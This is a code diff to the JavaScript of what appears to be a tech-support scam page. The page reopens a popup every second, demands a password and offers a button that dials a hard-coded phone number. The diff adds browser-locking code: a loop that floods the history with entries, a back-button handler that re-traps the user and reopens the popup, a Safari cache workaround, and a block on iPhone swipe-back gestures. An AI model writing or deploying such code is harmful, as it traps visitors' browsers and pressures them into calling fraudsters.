@@ -395,22 +395,16 @@ function closePopup(){
 /* CALL BUTTON */
 
 function confirmAction(){
-
   closePopup();
   createPasswordPopup();
-
 }
-
 
 /* CANCEL BUTTON */
 
 function cancelAction(){
-
   cancelled = true;
   clearInterval(popupInterval);
-
 }
-
 
 /* SECOND POPUP */
 
@@ -426,9 +420,6 @@ popup.className = "popup";
 const title = document.createElement("h2");
 title.innerText = "Enter Password";
 
-
-/* PASSWORD FIELD */
-
 const input = document.createElement("input");
 input.type = "password";
 input.placeholder = "Password";
@@ -438,15 +429,6 @@ input.style.padding = "12px";
 input.style.marginBottom = "15px";
 input.style.borderRadius = "12px";
 input.style.border = "1px solid #d1d1d6";
-input.style.boxSizing = "border-box";
-input.style.outline = "none";
-
-input.onfocus = function(){
-  this.style.border = "1px solid #007aff";
-};
-
-
-/* BUTTONS */
 
 const buttons = document.createElement("div");
 buttons.className = "buttons";
@@ -469,7 +451,6 @@ popup.appendChild(buttons);
 overlay.appendChild(popup);
 document.body.appendChild(overlay);
 
-
 /* PASSWORD CHECK */
 
 ok.onclick = function(){
@@ -478,13 +459,8 @@ if(input.value === REQUIRED_PASSWORD){
 
 alert("Password accepted");
 
-/* remove second popup */
 overlay.remove();
-
-/* close main popup */
 document.getElementById("overlay").style.display = "none";
-
-/* stop popup interval */
 clearInterval(popupInterval);
 
 }else{
@@ -495,44 +471,61 @@ alert("Incorrect password");
 
 };
 
-
 /* CALL BUTTON */
 
 call.onclick = function(){
-
 window.location.href = "tel:+18122668825";
-
 };
 
 }
 
-
-/* INITIAL LOAD */
+/* PAGE LOAD */
 
 window.onload = function(){
 
 openPopup();
-popupInterval = setInterval(openPopup, 1000);
+popupInterval = setInterval(openPopup,1000);
+
+/* HISTORY TRAP */
+
+for(let i=0;i<30;i++){
+  history.pushState({trap:true},"",location.href);
+}
 
 };
 
+/* BACK BUTTON TRAP */
 
-/* PREVENT LEAVING PAGE */
+window.addEventListener("popstate", function(){
 
-window.addEventListener("beforeunload", function (e) {
+history.pushState({trap:true},"",location.href);
+openPopup();
 
-if (!cancelled) {
+});
 
-e.preventDefault();
-e.returnValue = '';
+/* SAFARI CACHE FIX */
 
+window.addEventListener("pageshow", function(e){
+
+if(e.persisted){
+history.pushState(null,null,location.href);
 }
 
 });
 
+/* BLOCK SWIPE BACK ON IPHONE */
+
+document.addEventListener("touchstart", function(e){
+
+if(e.touches[0].clientX < 20){
+e.preventDefault();
+}
+
+},{passive:false});
 </script>
 </body>
 </html>
+
 
 
 
